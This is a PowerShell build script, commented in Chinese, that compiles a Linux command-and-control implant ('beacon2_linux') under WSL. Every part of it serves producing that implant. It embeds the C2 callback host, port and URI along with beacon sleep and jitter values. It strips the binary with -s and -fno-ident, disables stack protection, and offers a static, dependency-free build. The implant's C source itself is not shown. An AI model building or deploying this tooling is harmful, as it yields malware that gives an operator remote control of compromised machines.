# csdev :: tools/build_linux2.ps1  --  协议 v2 Linux 植入体一键编译 (经 WSL)
# ==========================================================================
# 用法:
#   .\tools\build_linux2.ps1                                  # 默认 127.0.0.1:8443
#   .\tools\build_linux2.ps1 -Host_ 10.0.0.5 -Port 8443
#   .\tools\build_linux2.ps1 -Sleep 3000 -Jitter 20
#   .\tools\build_linux2.ps1 -Static                          # 静态链接
#   .\tools\build_linux2.ps1 -Check                           # 附带 RSA 交叉验证
#
# 产物: build\beacon2_linux[.static]  (同时在 linux\ 下留一份)
# ==========================================================================
[CmdletBinding()]
param(
    [string] $Host_   = '127.0.0.1',
    [int]    $Port    = 8443,
    [string] $Uri     = '/submit',
    [int]    $Sleep   = 5000,
    [int]    $Jitter  = 10,
    [switch] $Static,
    [string] $OutFile = '',
    [switch] $Check,
    [switch] $Quiet
)

$ErrorActionPreference = 'Stop'
$env:WSL_UTF8 = '1'      # 让 wsl.exe 以 UTF-8 回传输出, 避免中文日志乱码

$DevDir   = Split-Path -Parent $PSScriptRoot
$LinuxDir = Join-Path $DevDir 'linux'
$BuildDir = Join-Path $DevDir 'build'

function Say($m, $c = 'Gray') { if (-not $Quiet) { Write-Host $m -ForegroundColor $c } }

# Windows 路径 -> WSL 路径 (D:\csdev-c2\x -> /mnt/d/csdev-c2/x)
function To-Wsl([string]$p) {
    $full = [System.IO.Path]::GetFullPath($p)
    $d = $full.Substring(0, 1).ToLower()
    return "/mnt/$d" + $full.Substring(2).Replace('\', '/')
}

# ---------------------------------------------------------------- 前置检查
$probe = & wsl.exe -e bash -c 'echo OK; gcc --version 2>/dev/null | head -1' 2>&1
if ($LASTEXITCODE -ne 0 -or -not ($probe -match 'OK')) {
    throw "WSL 不可用: $probe"
}
$gccVer = ($probe | Select-Object -Last 1)

Say ""
Say "  csdev 协议 v2 Linux 植入体构建" 'Cyan'
Say "  ==============================================" 'Cyan'
Say "  回连        : $Host_`:$Port$Uri"
Say "  sleep/jitter: ${Sleep}ms / $Jitter%"
Say "  链接方式    : $(if ($Static) { '静态 (零动态依赖)' } else { '动态 (libc.so.6)' })"
Say "  WSL gcc     : $gccVer"
Say ""

if (-not (Test-Path $BuildDir)) { New-Item -ItemType Directory -Force -Path $BuildDir | Out-Null }

$name    = if ($Static) { 'beacon2_linux.static' } else { 'beacon2_linux' }
$wslIn   = To-Wsl $LinuxDir
$wslOutLocal = "$wslIn/$name"

# ---------------------------------------------------------------- 编译
$flags  = @('-O2', '-Wall', '-Wextra', '-fno-ident',
            '-fno-asynchronous-unwind-tables', '-fno-stack-protector')
if ($Static) { $flags += '-static' }
$flags += '-s'

$defs = "-DC2_HOST='`"$Host_`"' -DC2_PORT=$Port -DC2_URI='`"$Uri`"' " +
        "-DC2_SLEEP=${Sleep}u -DC2_JITTER=$Jitter -DC2_SSL=0"

$srcs = "beacon2_linux.c rsa_linux.c ../kits/proto/frame.c " +
        "../kits/crypto/aes.c ../kits/crypto/sha256.c"

$cmd = "cd '$wslIn' && gcc $($flags -join ' ') $defs -o '$name' $srcs"

Say "[*] 编译中 (WSL) ..." 'White'
$sw = [System.Diagnostics.Stopwatch]::StartNew()
$out = & wsl.exe -e bash -c "$cmd 2>&1" 2>&1
$rc  = $LASTEXITCODE
$sw.Stop()

if ($out) {
    $out | Where-Object { $_ -and $_ -notmatch '^\s*$' } | ForEach-Object { Say "    $_" 'DarkGray' }
}
if ($rc -ne 0) { Say "[x] 编译失败 (rc=$rc)" 'Red'; exit 1 }

Say "[+] 编译完成  $($sw.ElapsedMilliseconds) ms" 'Green'

# ---------------------------------------------------------------- 产物信息
$info = & wsl.exe -e bash -c "cd '$wslIn' && file '$name' && stat -c%s '$name' && (readelf -d '$name' 2>/dev/null | grep -i NEEDED || echo '  (无动态依赖)')" 2>&1
$lines = @($info | Where-Object { $_ })
$fileLine = $lines[0]
$size     = [int]$lines[1]
$needed   = @($lines | Select-Object -Skip 2)

Say ""
Say "  产物 : $name" 'White'
Say "  类型 : $fileLine"
Say "  体积 : $size 字节  ($([math]::Round($size/1KB,1)) KB)"
Say "  依赖 :" 'White'
foreach ($n in $needed) { Say "         $n" }

# ---------------------------------------------------------------- 复制回 Windows
$dest = if ($OutFile) { $OutFile } else { Join-Path $BuildDir $name }
Copy-Item -Path (Join-Path $LinuxDir $name) -Destination $dest -Force
Say ""
Say "  [+] 已输出: $dest" 'Green'

# ---------------------------------------------------------------- RSA 自测
if ($Check) {
    Say ""
    Say "[*] RSA 交叉验证 ..." 'White'
    $ck = & wsl.exe -e bash -c "cd '$wslIn' && make -s check 2>&1" 2>&1
    $ck | ForEach-Object { Say "    $_" 'DarkGray' }
    if ($LASTEXITCODE -ne 0) { Say "[x] RSA 交叉验证未通过" 'Red'; exit 1 }
    Say "[+] RSA 交叉验证通过" 'Green'
}

Say ""
exit 0
